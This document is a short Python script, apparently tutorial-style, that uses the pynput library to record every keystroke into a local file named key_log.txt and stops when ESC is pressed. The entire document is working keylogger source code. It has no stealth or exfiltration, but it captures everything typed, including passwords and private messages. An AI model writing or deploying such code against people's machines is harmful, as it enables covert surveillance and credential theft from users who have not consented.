# Import the pynput library
from pynput.keyboard import Key, Listener

# Specify a file to log keystrokes
log_file = "key_log.txt"

# Function to write the keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        # Format the keystrokes and avoid showing 'Key.'
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write('\n')  # Newline on space
        elif k.find("Key") == -1:
            f.write(k)

# Function to stop the keylogger on ESC press
def on_press(key):
    write_to_file(key)
    if key == Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
